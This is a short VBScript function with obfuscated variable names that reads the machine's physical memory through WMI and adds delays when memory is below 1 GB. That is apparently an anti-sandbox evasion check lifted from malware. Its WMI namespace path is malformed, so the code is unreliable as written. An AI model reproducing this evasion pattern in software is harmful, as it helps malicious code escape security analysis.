Function CheckAvailableMemory()
  Set VRfvQEHCs=GetObject("winmgmts:\\.\oot\cimv2")
  Set uxSpQuH=VRfvQEHCs.ExecQuery("Select * from Win32_ComputerSystem")
  For Each XqDiZDh In uxSpQuH
    zhlOwdMZ=zhlOwdMZ+Int((XqDiZDh.TotalPhysicalMemory) / CLng("1048576"))+Cint("1")
  Next
  If zhlOwdMZ < Cint("1024") Then
    WaitSeconds
    WaitSeconds
  End If
End Function
